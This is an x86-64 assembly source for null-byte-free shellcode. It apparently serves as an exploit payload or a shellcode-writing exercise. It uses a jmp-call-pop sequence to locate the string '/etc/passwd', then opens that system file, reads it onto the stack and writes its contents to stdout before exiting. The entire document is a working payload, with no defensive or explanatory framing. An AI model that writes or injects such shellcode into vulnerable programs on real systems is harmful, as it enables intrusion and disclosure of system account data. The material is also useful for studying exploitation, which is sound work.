global _start

section .text

_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor rax,rax
mov byte [rdi + 11], al

mov rsi, rax ; set O_RDONLY flag
add al, 2
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
sub rax, rdi
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
mov rax, rdi
syscall
  
; syscall exit
push 60
pop rax
syscall
  
_push_filename:
call _readfile
path: db "/etc/passwdC"